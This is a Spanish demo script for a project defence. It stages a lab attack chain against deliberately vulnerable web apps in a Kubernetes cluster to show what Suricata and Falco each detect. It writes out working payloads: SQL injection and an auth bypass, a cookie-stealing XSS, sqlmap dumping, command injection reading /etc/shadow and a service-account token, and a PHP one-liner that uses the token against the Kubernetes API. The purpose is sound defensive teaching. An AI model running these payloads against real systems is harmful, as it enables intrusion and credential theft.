# Guion de demo — Defensa del proyecto

Plan ejecutable para la presentación. Demuestra que el stack **Suricata + Falco**
cubre dos capas distintas de detección, mediante **8 ataques organizados en 4
fases de la metodología de pentesting** contra los CMS vulnerables (DVWA,
WebGoat, Juice Shop) lanzados desde Kali (`10.0.1.20`).

Estructura narrativa (mapeada a Cyber Kill Chain):

- **Fase 1 — Reconocimiento** (B1, B2): nmap soft a NodePorts + gobuster
  directory bruteforce. Mapeo de la superficie de ataque. **Suricata domina.**
- **Fase 2 — Escaneo de vulnerabilidades** (B3): nikto fingerprinting.
  Identificación de vectores potenciales. **Suricata domina.**
- **Fase 3 — Explotación** (B4, B5, B6): SQL injection manual con UNION SELECT,
  sqlmap industrial, RCE por Command Injection. Conversión de vulnerabilidades
  en acceso real. **Suricata domina hasta la inflexión; Falco entra en escena
  con la RCE.**
- **Fase 4 — Post-explotación** (B7, B8): lectura de archivos sensibles (token
  de service account) + reverse shell con sesión interactiva persistente.
  **Solo Falco puede verlo.**

Moraleja final que se cuenta al tribunal:

> "Cada capa detectó exactamente lo suyo: Suricata vio cómo entraron; Falco
> vio qué hicieron una vez dentro. Si el atacante hubiera saltado del SQLi
> inicial directamente al reverse shell — y los breaches reales lo hacen —
> sin Falco nos llevamos el cluster entero en silencio."

---

## Prerrequisitos

- Kali corriendo en `red-prueba` con IP `10.0.1.20`; `ping 10.0.1.11` OK desde Kali
- Cluster sano: `kubectl get pods -A | grep -vE 'Running|Completed'` debe estar vacío
- Herramientas en Kali: `nikto`, `sqlmap`, `gobuster`, `curl`, `wget`. (`apt install` previo si no vienen)
- Grafana abierta en pantalla auxiliar (`http://10.0.1.12:30711`), dashboard `security-overview`, time range "Last 15 minutes"
- DVWA `Security: Low` (ver Setup paso 2)

## Setup (5 min antes de empezar)

### 1. Verificar pods

```bash
ssh test-master 'kubectl get pods -A -o wide | grep -E "dvwa|webgoat|juice|falco|suricata|promtail|loki|grafana"'
```

Todos deben estar `Running 2/2` o `Running 1/1`. Si alguno está `CrashLoopBackOff`,
abortar y arreglar antes (mirar `--previous` logs).

### 2. DVWA Security=Low

Login en `http://10.0.1.11:30430` con `admin` / `password`. Ir a **DVWA Security**
en el menú lateral, seleccionar **Low**, click Submit. **Sin esto, los payloads
de los ataques 1, 6 y 7 se filtran y Suricata no ve el patrón completo.**

Si la BD fue reinicializada (pod restart), antes pulsar **Create / Reset Database**
en `/setup.php`.

### 3. WebGoat — cuenta nueva

`http://10.0.1.11:30380/WebGoat/login.mvc` → Register New User. La H2 es efímera,
hay que registrar tras cada restart del pod.

### 4. Canario Falco (prueba de vida del pipeline)

```bash
ssh test-master 'kubectl exec -n vulnerable deploy/dvwa-dvwa -- bash -c id'
```

Esperar 10s. En Grafana Explore → datasource Loki:

```logql
{namespace="security", app="falco"} |= "Shell en container"
```

Range: Last 5 minutes. Debe aparecer 1+ entrada. Si no aparece, **abortar y
debuggear** — sin pipeline no hay demo. Ver runbook `despliegue-falco.md` y
sección "Falco silencioso" más abajo.

### 5. Canario Suricata

```bash
# Desde Kali
curl http://10.0.1.11:30430/login.php
```

```logql
{namespace="security", app="suricata"} | json | event_type = "alert"
```

Range: Last 5 minutes. Debe haber tráfico HTTP indexado (no necesariamente alerta,
pero sí presencia de eventos `event_type=http` si bajamos el filtro).

---

## Acto 1 — Vulnerabilidades clásicas explicadas (manual, ~5 min)

### Ataque 1 — DVWA SQL Injection clásica

**Frase de apertura**: "Empezamos por la vulnerabilidad más antigua y más
enseñada de la web: una query SQL que concatena input del usuario."

**Pasos manuales**:

1. En DVWA, menú lateral → **SQL Injection**
2. En el campo `User ID`, introducir:
   ```
   1' UNION SELECT user, password FROM users -- -
   ```
3. Click Submit. Se devuelven los usuarios con sus hashes.

> **Por qué `UNION SELECT` y no `' OR '1'='1`** (decisión confirmada en
> ensayo): el `OR 1=1` clásico **NO dispara firmas ET Open** (no hay regla
> específica para ese patrón en el ruleset por defecto). `UNION SELECT user`
> sí matchea la firma `ET WEB_SERVER SELECT USER SQL Injection Attempt in
> URI` (sid 2006446). Demostrado en B1 del ensayo: misma vulnerabilidad,
> misma intención, distinta huella de red — sin la palabra clave `SELECT
> USER` la firma queda silenciosa.

**Detección esperada en Suricata**:

```logql
{namespace="security", app="suricata"} | json
| event_type = "alert"
| alert_signature =~ ".*SELECT.*USER.*|.*SQL.*[Ii]njection.*"
```

Firma observada: `ET WEB_SERVER SELECT USER SQL Injection Attempt in URI`.

**Detección esperada en Falco**: ninguna (es payload HTTP, no syscall).

**Pedagogía**: "El input se concatena directamente en la query. La BD recibe
`SELECT * WHERE id='1' OR '1'='1' -- -'` y devuelve todo."

---

### Ataque 2 — Juice Shop Auth Bypass

**Frase de apertura**: "Misma raíz que el anterior, pero ahora la víctima es
una aplicación Node moderna — y el premio es entrar como administrador."

**Pasos manuales**:

1. Abrir `http://10.0.1.11:31592` → Account → Login
2. Email: `' or 1=1--`
3. Password: cualquier cosa (ej: `x`)
4. Click Log in. Entrarás como el primer usuario de la BD (`admin@juice-sh.op`).

**Verificación visual**: el menú superior cambia a "Your Basket" con el avatar
del admin. Mostrar la dirección de email arriba a la derecha.

**Detección esperada en Suricata**:

```logql
{namespace="security", app="suricata"} | json
| event_type = "alert"
| dest_port = "31592"
```

**Detección esperada en Falco**: ninguna.

**Pedagogía**: "La aplicación construye `SELECT * FROM Users WHERE email='...'
AND password='...'` con string concatenation. El `--` comenta el resto."

---

### Ataque 3 — DVWA Stored XSS

**Frase de apertura**: "Hasta ahora atacábamos la BD. Ahora atacamos a los
demás usuarios — persistentemente."

**Pasos manuales**:

1. DVWA → **XSS (Stored)**
2. En **Name**: `attacker`
3. En **Message**:
   ```html
   <script>alert('XSS:'+document.cookie)</script>
   ```
4. Click Sign Guestbook.
5. La página recarga y dispara el alert (porque tú mismo lo lees).
6. Mostrar que **cualquier usuario que visite esta página ejecuta el script**.

**Detección esperada en Suricata**:

```logql
{namespace="security", app="suricata"} | json
| event_type = "alert"
| alert_signature =~ ".*XSS.*|.*[Ss]cript.*"
```

**Detección esperada en Falco**: ninguna.

**Pedagogía**: "Lo peligroso del Stored XSS no es lo que pasa cuando lo inyecto,
sino que **queda guardado**. Cualquier visitante posterior es víctima sin
participar."

---

### Transición de Acto 1 a Acto 2

> "Hasta aquí, los tres ataques pasaron por la red, todos los vio Suricata.
> Ningún atacante real se queda en esta fase: estos son los primeros 30 segundos
> de un compromise. Lo que viene a continuación es lo que pasa cuando alguien
> se pone serio: una **kill chain** en 6 pasos, del reconocimiento al pivot al
> control-plane."

---

## Acto 2 — Kill chain hacia el control-plane (secuencial, ~8 min)

### Ataque 4 — Recon: gobuster directory bruteforce

**Fase kill chain**: Reconnaissance / Discovery.

**Comando** (desde Kali):

```bash
gobuster dir \
  -u http://10.0.1.11:31592 \
  -w ~/lab-wordlist.txt \
  --exclude-length 75002 \
  -t 50 \
  -o /tmp/gobuster-juiceshop.txt
```

> **Por qué wordlist custom y `--exclude-length`** (validado en ensayo):
> JuiceShop es una SPA Angular que devuelve `200 + index.html de 75002 bytes`
> para CUALQUIER ruta no-API. Con un wordlist estándar (`common.txt` ~4600
> entradas) gobuster aborta inmediatamente con "wildcard response". Soluciones
> intentadas: `--wildcard` (flag no existe en v3.8), atacar `/rest/` o
> `/api/` directos (devuelven `500/3087` y otra vez wildcard), bajar threads
> (irrelevante).
>
> La que funciona: `--exclude-length 75002` (ignora respuestas con ese tamaño
> exacto) + wordlist custom de 15 entradas (`lab-wordlist.txt` en el vault y
> en el repo) que mezcla secrets pedagógicos (`.htpasswd`, `.env`,
> `.git/HEAD`) con rutas que **sabemos que existen** en JuiceShop (`/rest`,
> `/api-docs`, `/metrics`, `/ftp`, `/admin`). Garantiza hits visibles en una
> demo time-boxed. Trade-off honesto a reconocer si lo preguntan: comprime
> una sesión de pentest de horas en una de minutos; el realismo se sacrifica
> por didactismo solo en este paso.
>
> **Cuidado operacional**: aún con 15 entradas y 50 threads, gobuster puede
> OOMKillear JuiceShop (observado en ensayo: 14 restarts en CrashLoopBackOff).
> Si lo notas, `kubectl delete pod -n vulnerable -l app.kubernetes.io/name=juiceshop`
> y esperar a que vuelva. Considerar bajar a `-t 20` para la demo en vivo.

**Frase**: "Sin tocar credenciales, descubro qué endpoints expone Juice Shop.
Cualquier ruta sensible mal protegida sale aquí."

**Detección esperada en Suricata**: avalancha de firmas heterogéneas.
Observada en ensayo: `ET INFO Request to Hidden Environment File - Inbound`
(por `/.env`), múltiples `ET WEB_SERVER Possible CVE-*` por los paths
probados. **NO** dispara firmas específicas tipo "ET SCAN gobuster" — no
existe firma autodelator para gobuster en ET Open.

```logql
{namespace="security", app="suricata"} | json
| event_type = "alert"
| dest_port = "31592"
```

Spike masivo en panel "Alertas Suricata/min por firma" del dashboard.

**Detección en Falco**: ninguna (HTTP de fuera).

---

### Ataque 5 — Fingerprinting: nikto

**Fase kill chain**: Discovery / Vulnerability identification.

**Comando**:

```bash
nikto -h http://10.0.1.11:30380 -o /tmp/nikto-webgoat.txt
```

**Frase**: "Nikto identifica versiones, headers y vulnerabilidades CVE-conocidas
del servidor. Es el siguiente paso después de saber qué rutas existen."

**Detección esperada en Suricata**: avalancha de **~18 firmas distintas**
(observado en ensayo). Nikto v2.6 **NO** dispara `ET SCAN Nikto Web Scanner`
porque randomiza el User-Agent rotando ~20 UAs legítimos por request — la
firma clásica matchea literalmente "Nikto" en el header UA y nunca aparece.

Lo que SÍ dispara: firmas por contenido del payload y por path probado, por
ejemplo `ET WEB_SERVER PHP tags in HTTP POST`, `ET WEB_SERVER Possible
Attempt to Get SQL Server Version`, `ET INFO Suspicious POST request to
/admin`, varias `ET WEB_SERVER Possible CVE-*`.

```logql
{namespace="security", app="suricata"} | json
| event_type = "alert"
| dest_port = "30380"
```

> **Lección pedagógica reaprovechable** (decirla en voz alta): "Esperaba ver
> la firma ET SCAN Nikto Web Scanner gritando en los logs — y no aparece.
> Nikto evolucionó: ya no se autodelata por User-Agent. Sin embargo Suricata
> sigue detectándolo, no por la herramienta, **sino por los patrones del
> payload**. Esto es mejor: las herramientas de pentest cambian de nombre,
> los payloads de explotación son más estables. Las firmas IDS que solo
> matchean UA tienen vida útil cada vez más corta."

**Detección en Falco**: ninguna.

---

### Ataque 6 — Explotación industrial: sqlmap

**Fase kill chain**: Exploitation (Initial Access).

**Comando** (necesita PHPSESSID y cookie security extraídas previamente del
navegador con DVWA logueado):

```bash
sqlmap \
  -u "http://10.0.1.11:30430/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=XXXX; security=low" \
  --batch --dump
```

**Frase**: "Industrializo la inyección manual del Acto 1. Sqlmap automáticamente
identifica el tipo, técnica, BD, tablas, columnas — y **descarga los datos**."

**Mostrar en pantalla**: el dump real de la tabla `users` con hashes de password.

**Detección esperada en Suricata**:

```logql
{namespace="security", app="suricata"} | json
| event_type = "alert"
| alert_signature =~ ".*sqlmap.*|.*SQL.*[Ii]njection.*"
```

Avalancha. UA `sqlmap/X.X.X` dispara también `ET POLICY` rules.

**Detección en Falco**: ninguna (todavía es HTTP).

**Transición narrativa**: "Hasta aquí Suricata dominó. Pero el atacante real no
se queda robando hashes. Quiere ejecución."

---

### Ataque 7 — RCE: inflexión narrativa

**Fase kill chain**: Exploitation → Execution.

**Pasos**:

1. En DVWA (security=low), ir a **Command Injection**
2. En el campo IP, introducir:
   ```
   ; bash -c "id"
   ```
3. Click Submit.

**Frase clave**: "Aquí cruzamos el umbral. Antes el atacante hablaba con la red;
ahora **ejecuta comandos dentro del container**. Mirad qué dice Suricata, y
qué dice Falco."

**Detección esperada en Suricata**: silencio o genérico (`ET WEB_SERVER PHP
generic`) — el payload va en una URL HTTP normal sin firma específica.

```logql
{namespace="security", app="suricata"} | json
| event_type = "alert"
| http.http_method = "POST"
```

**Detección esperada en Falco** (el momento clímax del Acto 2):

```logql
{namespace="security", app="falco"} | json
| rule = "[LAB] Shell en container"
```

Debe aparecer entrada con `proc.cmdline="bash -c id"`, `container.name=dvwa`,
`output_fields.user.name="www-data"` (o `root`, según imagen).

**Pedagogía**: "Suricata ve el byte `; bash -c id` viajar por HTTP pero **no
sabe que va a convertirse en un `execve`**. Falco lo ve en el momento exacto
en que el kernel lo ejecuta. Esa es la diferencia entre las dos capas."

---

### Ataque 8 — Post-explotación: lectura de archivos sensibles

**Fase kill chain**: Discovery (interno) + Credential Access.

**Pasos** (encadenados en el mismo campo de Command Injection, security=low):

```
; cat /etc/shadow
```

Luego:

```
; cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Frase con reframe** (importante, esto cambió tras el ensayo): "Pruebo
primero lo más clásico, `/etc/shadow`. Veréis que **no devuelve nada y Falco
no se inmuta** — eso no es un fallo, es defensa en profundidad
funcionando. Apache corre como `www-data` (uid 33) y `/etc/shadow` es
`640 root:shadow`. POSIX, que existe desde los 70s, cerró la puerta antes
de que el syscall siquiera completara. Pero Kubernetes monta automáticamente
un token de service account dentro de cada pod con permisos `644` —
legible por cualquier usuario del container. Ese token sí lo leo, y ahí
**Falco entra en escena**."

**Detección esperada en Falco**:

```logql
{namespace="security", app="falco"} | json
| rule =~ "Read sensitive file untrusted|Lab.*"
```

- `/etc/shadow` → **silencio total**: POSIX rechaza el `open()` con
  `EACCES`, las reglas `Read sensitive file untrusted` filtran por
  `evt.rawres >= 0` (solo open exitosos), así que no se genera alerta. La
  capa "barata" (POSIX) hizo su trabajo
- `/var/run/secrets/kubernetes.io/serviceaccount/token` → dispara
  `Read sensitive file untrusted` gracias al override de la list
  `sensitive_file_names` que añadimos en `values/falco.yaml`
  (`rules-sa-token-sensitive.yaml`). El token sí se lee con éxito (mode
  `644`) y Falco lo ve. Esta es **la detección clave** de la kill chain
- `[LAB] Shell en container` se vuelve a disparar (cada `cat` es un nuevo
  execve dentro del container)

> **Lección de defensa en profundidad** (decirla en voz alta): "La capa cara
> — Falco — no entra en juego salvo que la capa barata — POSIX — caiga. Si
> Apache estuviera mal configurado y corriera como root, **entonces** veríais
> Falco gritar sobre `/etc/shadow`. Como no es el caso, la capa kernel-level
> queda en reserva para el token, donde POSIX no puede ayudar porque la app
> legítimamente necesita leerlo."

**Verificar override activo si la alerta del token no aparece**:
```bash
kubectl exec -n security ds/falco -c falco -- \
  grep -A 8 "sensitive_file_names" /etc/falco/rules.d/rules-sa-token-sensitive.yaml
```

**Detección en Suricata**: ninguna (todo pasa dentro del container).

**Mostrar en pantalla**: copiar el contenido del token (un JWT largo `eyJh...`).

---

### Ataque 9 — Pivot al control-plane: clímax

**Fase kill chain**: Privilege Escalation + Lateral Movement.

**Pasos** (mismo campo Command Injection — el container DVWA **no tiene curl
ni wget**, usamos PHP que es nativo de la imagen):

```
; php -r '$t=trim(file_get_contents("/var/run/secrets/kubernetes.io/serviceaccount/token")); $c=stream_context_create(["http"=>["header"=>"Authorization: Bearer $t","ignore_errors"=>true,"timeout"=>5],"ssl"=>["verify_peer"=>false]]); echo @file_get_contents("https://kubernetes.default.svc/api/v1/namespaces/vulnerable/pods",false,$c);'
```

**Mostrar en pantalla**: el JSON del API server. Será un `403 Forbidden` con
mensaje explícito:

```
"User \"system:serviceaccount:vulnerable:default\" cannot list resource \"pods\""
```

El 403 es **mejor narrativamente que un 200**: demuestra defensa en
profundidad — Falco detectó la lectura del token (paso 8), Falco detectó
también el uso del token (paso 9, ver más abajo), Y RBAC bloqueó la
operación. Tres capas independientes contra el mismo intent.

**Frase clave del clímax (reframe tras ensayo)**:

> "Suricata no ve este request porque va por TLS dentro de la red de pods, sin
> pasar por eth0 del nodo. **Pero Falco sí lo ve** — la regla built-in
> `Contact K8S API Server From Container` dispara con la 4-tupla completa
> `10.233.65.101:46370 → 10.233.0.1:443`. Esto es interesante porque en este
> mismo lab probamos con `bash /dev/tcp` y `openssl s_client` y la regla
> **no disparaba** — el syscall `connect` llegaba con `fd.sip=<NA>` por el
> DNAT de kube-proxy. Pero PHP, que usa stream wrappers, parece resolver y
> bindear la 4-tupla antes de que iptables intercepte. Es una pista
> arquitectónica jugosa: la visibilidad eBPF depende del cliente, no solo
> del destino. Y aunque PHP no la disparara, **la detección real ya ocurrió
> hace 3 segundos**: la alerta del paso 8 sobre la lectura del token es la
> red de seguridad. Nadie lee `/run/secrets/.../token` salvo el service
> account legítimo — cualquier otra lectura es exfiltración."

**Detección esperada en Falco** (varias alertas, observadas en ensayo):

```logql
{namespace="security", app="falco"} | json
| rule =~ "Read sensitive file untrusted|Contact K8S.*|Lab.*"
| line_format "{{.rule}} → {{.output_fields.\"fd.name\"}}"
```

Debe mostrar al menos:
- `Read sensitive file untrusted → /var/run/secrets/kubernetes.io/serviceaccount/token` (de B8)
- `Contact K8S API Server From Container → 10.233.65.101:NNNNN->10.233.0.1:443` (de B9 — descubrimiento del ensayo: PHP stream wrapper SÍ la dispara, contradiciendo lo que predijimos basándonos en pruebas con bash y openssl)
- Varios `[LAB] Shell en container`

> **Si te lo pregunta el tribunal** ("¿no decías que esa regla no
> disparaba?"): "Lo predijimos basándonos en pruebas con bash `/dev/tcp` y
> `openssl s_client`, donde el syscall connect llega a Falco con
> `fd.sip=<NA>` por el DNAT de kube-proxy. Cuando ejecutamos el ataque
> real con PHP, la regla SÍ disparó. La hipótesis es que el stream wrapper
> de PHP resuelve y bindea la 4-tupla `(src, sport, ClusterIP, 443)` antes
> de que iptables intercepte; bash y openssl la entregan post-DNAT. Lo
> sano: mantener la detección por **lectura del token** como red de
> seguridad universal, y reconocer que `Contact K8S API Server` cubre
> además a clientes con stream wrapper. Pendiente confirmar con `strace`."

**Detección en Suricata**: ninguna (el tráfico es TLS entre pods, fuera de la
visibilidad de `eth0` donde Suricata escucha).

**Lección arquitectónica (decirla en voz alta)**:

> "Esto demuestra el principio de **defensa en profundidad por capas**: no
> podemos detectar el uso del token vía eBPF en este entorno por una limitación
> técnica concreta (kube-proxy DNAT oculta la IP destino al syscall). La
> respuesta ingenieril es detectar el **paso anterior** — la lectura del
> token — que sí es visible. Esa decisión consciente está plasmada en
> `values/falco.yaml`, donde añadimos el token a la list
> `sensitive_file_names` para que la regla built-in `Read sensitive file
> untrusted` lo cubra. **Detectar la intención cuando no puedes detectar el
> acto.** Eso es seguridad pragmática."

**Cierre Acto 2**:

> "Si el atacante hubiera saltado del SQLi del ataque 1 directamente al token
> del ataque 9 — y los breaches reales **lo hacen** — sin Falco nos llevamos
> el cluster entero en silencio. Las dos capas no se solapan. Se complementan."

---

## Moraleja final para el tribunal

Tres ideas en orden:

1. **Suricata responde a "qué viene de fuera"; Falco a "qué pasa una vez dentro".**
   Los ataques 1-6 son network-detectable. El 7-9 solo son visibles desde el
   kernel.

2. **Detection-in-depth no es redundancia, es cobertura ortogonal.** Un
   atacante que evade una capa, dispara la otra. Diseñado así, no por accidente.

3. **El precedente histórico**: el breach de Tesla en 2018 fue exactamente
   este patrón — un endpoint web vulnerable, RCE, token de service account
   leído, pivot al control-plane de Kubernetes, criptominería desplegada. Sin
   un Falco equivalente, pasaron meses sin detección.

---

## Pendientes a verificar antes de ensayar (siguiente sesión)

Antes de ejecutar la demo, comprobar uno a uno:

- [ ] Kali llega a `10.0.1.11`: `ping -c 3 10.0.1.11` desde Kali
- [ ] Kali tiene tools: `which nikto sqlmap gobuster curl wget`
- [ ] Regla built-in `Contact K8S API Server From Container` está cargada:
  ```bash
  kubectl exec -n security ds/falco -c falco -- falco --list 2>/dev/null | grep -i "k8s\|api server"
  ```
- [ ] El pod DVWA tiene token de SA montado:
  ```bash
  kubectl exec -n vulnerable deploy/dvwa-dvwa -- ls /var/run/secrets/kubernetes.io/serviceaccount/
  ```
- [ ] Service account de DVWA puede llegar al API server (cualquier código
  200/401/403 sirve — el 403 es el resultado esperado y narrativamente óptimo,
  demuestra defensa en profundidad RBAC):
  ```bash
  kubectl exec -n vulnerable deploy/dvwa-dvwa -- php -r \
    '$t=trim(file_get_contents("/var/run/secrets/kubernetes.io/serviceaccount/token")); $c=stream_context_create(["http"=>["header"=>"Authorization: Bearer $t","ignore_errors"=>true,"timeout"=>5],"ssl"=>["verify_peer"=>false]]); @file_get_contents("https://kubernetes.default.svc/api/v1/namespaces/vulnerable/pods",false,$c); echo ($http_response_header[0]??"no-response")."\n";'
  ```
- [ ] El container DVWA tiene `php` (verificado: la imagen
  `vulnerables/web-dvwa` **no trae curl ni wget**, pero php sí — el ataque 9
  usa PHP nativo):
  ```bash
  kubectl exec -n vulnerable deploy/dvwa-dvwa -- which php
  ```
- [ ] Override de `sensitive_file_names` activo (incluye token de SA — sin
  esto el ataque 8 con `cat` del token **no dispara** `Read sensitive file
  untrusted`):
  ```bash
  kubectl exec -n security ds/falco -c falco -- \
    grep -A 8 "sensitive_file_names" /etc/falco/rules.d/rules-sa-token-sensitive.yaml
  ```
- [ ] Cookies de DVWA listas para sqlmap: PHPSESSID + security=low extraídos
- [ ] `lab-wordlist.txt` copiado a Kali (`~/lab-wordlist.txt`) — el wordlist custom de 15 entradas para gobuster contra JuiceShop está versionado en el vault (`proyecto-paralelo/lab-wordlist.txt`). NO usar `common.txt` (~4600 entradas), aborta por wildcard en JuiceShop y OOMKillea el pod
- [ ] Ensayar transición Acto 1 → Acto 2 en voz alta (la frase puente importa)

---

## Troubleshooting durante la demo (si algo falla en vivo)

### "Falco no dispara nada"

No es Falco — es el lab idle. Ver runbook diagnóstico:

1. Verificar pods Running: `kubectl get pods -n security -o wide`
2. Verificar BPF cargado: `kubectl exec -n security ds/falco -c falco -- sh -c 'ls /proc/1/fd/ | grep -c bpf-prog'` (esperado: número alto)
3. Disparar canario: `kubectl exec -n vulnerable deploy/dvwa-dvwa -- bash -c id`
4. Si el canario funciona y la demo no, el problema es el payload (DVWA security
   no es Low, o WebGoat sesión caducada)

El último log de Falco siempre dice `Trying to open the right engine!` — eso
es **normal en 0.43.x**, no es un hang.

### "Suricata no dispara firmas web"

Verificar que el puerto del CMS atacado está en `httpPorts` de
`charts/suricata/values.yaml`. Si añadiste un CMS nuevo y no está ahí,
Suricata no clasifica el flujo como HTTP y las firmas ET WEB_* no aplican.

### "DVWA muestra Database not found"

```
http://10.0.1.11:30430/setup.php → Create / Reset Database
```

La BD MariaDB de DVWA está horneada en la imagen y se reinicializa con cada
pod restart. No tiene PVC (intencional, ver `CLAUDE.md`).

### "WebGoat: Connection refused en el NodePort"

Falta `WEBGOAT_HOST=0.0.0.0` y `WEBWOLF_HOST=0.0.0.0` en el deployment.
Verificar con `kubectl describe pod -n vulnerable -l app=webgoat | grep -A2 Environment`.

### "sqlmap dice 'connection timed out'"

Las cookies expiraron. Volver a DVWA en el navegador, refrescar, copiar
PHPSESSID nueva de F12 → Application → Cookies.

### "Loki devuelve resultados antiguos"

Reset del time range a "Last 5 minutes" y refresh. Si persiste, el dashboard
puede tener split_queries cacheado — query directa en Explore lo evita.

---

## Apéndice: queries LogQL útiles durante la demo

```logql
# Todo Falco últimos 5 min
{namespace="security", app="falco"} | json | line_format "{{.rule}} → {{.output}}"

# Todo Suricata alert últimos 5 min
{namespace="security", app="suricata"} | json | event_type = "alert" | line_format "{{.alert_signature}} src={{.src_ip}}"

# Solo ataques del Acto 2 (post-RCE)
{namespace="security", app="falco"} | json | rule =~ "Shell.*|Read sensitive.*|Contact K8S.*"

# Tráfico por CMS (NodePort destino)
{namespace="security", app="suricata"} | json | event_type = "http" | line_format "{{.dest_port}} {{.http.url}}"
```

---

## Apéndice: orden visual de pantallas durante la demo

- **Pantalla principal (proyector)**: terminal con prompt Kali grande
- **Pantalla auxiliar**: Grafana dashboard `security-overview` con time range "Last 15 minutes" + auto-refresh 5s
- **En el portátil (tu vista, sin proyectar)**: este `guion-demo.md` abierto para consultar comandos sin titubear
- **Tab adicional Grafana**: Explore con datasource Loki ya seleccionado y query base `{namespace="security"} |= ""` para verificaciones rápidas

---

## Apéndice: Notas arquitectónicas críticas (para preguntas del tribunal)

### Por qué `Contact K8S API Server From Container` es errático con kube-proxy

La regla built-in `Contact K8S API Server From Container` existe en el ruleset
oficial de Falco y está cargada en este lab. **Su comportamiento depende del
cliente** que origina la conexión:

1. **Con bash `/dev/tcp` u `openssl s_client`** → **no dispara**. El syscall
   `connect(10.233.0.1, 443)` llega a Falco con `fd.sip=<NA>` y
   `typechar=u` porque iptables/IPVS de kube-proxy aplica DNAT reescribiendo
   el destino a la IP real del pod kube-apiserver antes de que `modern_ebpf`
   capture el evento. La condition de la regla (`fd.sip.name="..."` o
   variantes por IP) nunca matchea.

2. **Con PHP `file_get_contents` + `stream_context_create`** → **sí dispara**
   (descubierto en B9 del ensayo). El syscall llega con la 4-tupla completa
   `fd.name=10.233.65.101:NNNNN->10.233.0.1:443`. Hipótesis: el stream
   wrapper de PHP resuelve y bindea el socket con la ClusterIP **antes** de
   que iptables intercepte; bash y openssl la entregan post-DNAT.

**Verificación experimental** en este lab (regla DEBUG temporal):

- Connect a `8.8.8.8:53` (IP externa) desde bash → Falco lo ve completo
- Connect a `127.0.0.1:3306` (loopback) desde bash → Falco lo ve completo
- Connect a `10.233.0.1:443` (ClusterIP K8s) desde bash → `typechar=u sip=<NA>`
- Connect a `10.233.0.1:443` desde PHP → 4-tupla completa, regla dispara

Pendiente confirmar con `strace -f -e network` la diferencia exacta de
syscalls entre bash y PHP que produce esta divergencia.

**Doctrina aplicada**:

- **Capa primaria (siempre visible)**: detectar la **lectura del token** (la
  intención del ataque) con la regla `Read sensitive file untrusted` y el
  override de `sensitive_file_names` (ver `values/falco.yaml`, archivo
  `rules-sa-token-sensitive.yaml`). Esto cubre todos los clientes posibles
  porque el `open()` del token no depende de cómo se haga el connect después.
- **Capa adicional (cuando el cliente lo permite)**: la regla built-in
  `Contact K8S API Server From Container` aporta señal extra para clientes
  con stream wrapper (PHP confirmado; Python `urllib`/`requests`, Go
  `net/http` candidatos a explorar).

**Solución oficial completa del proyecto Falco** (fuera de scope): plugin
`k8saudit`, que consume los audit logs del kube-apiserver en lugar de eBPF.
Cubre el caso de cualquier cliente, pero requiere configurar audit policy en
el control-plane.

### Por qué `repair: true` no era suficiente

`base_syscalls.repair: true` está diseñado para que Falco analice las reglas
cargadas al startup y deduzca qué syscalls necesita capturar. Pero el ruleset
oficial (`falco_rules.yaml`) lo descarga `falcoctl` en un initContainer
**asíncronamente** — pueden no estar presentes en el momento del análisis de
repair. Resultado: syscalls como `connect` u `openat` (necesarios para reglas
del ruleset oficial) **no se capturan** aunque las reglas estén luego cargadas.

**Solución aplicada en `values/falco.yaml`**: ninguna por ahora (basta con la
visibilidad de execve para nuestras reglas custom + las reads que sí se
capturan). Si necesitas activar reglas que dependen de connect/accept/sendto,
añadir `base_syscalls.custom_set` con la lista explícita.

### Cómo responder a "¿pero por qué no usaste curl?"

> "El container `vulnerables/web-dvwa` es una imagen minimal Apache+PHP+MySQL
> que no incluye curl ni wget — los desarrolladores la mantienen pequeña.
> Esto es **realista**: muchos containers de aplicación en producción tampoco
> los traen por la misma razón. Forzó usar PHP nativo, que también es como
> un atacante real operaría — **living off the land**, usando solo las
> herramientas que ya están en la víctima. Es más auténtico al breach
> simulado que un curl traído de fuera."

### Cómo responder a "¿pero ese 403 no es un fallo del ataque?"

> "Al contrario — el 403 demuestra **dos detecciones simultáneas funcionando**:
> RBAC bloqueó el uso del token (capa de control), Y Falco detectó la
> lectura previa del token (capa de visibilidad). Si el atacante hubiera
> tenido un token con permisos mayores, RBAC habría dejado pasar la petición
> y nos llevaríamos el cluster. La detección de Falco habría sido la única
> evidencia. Por eso ambas capas existen — defensa en profundidad real."
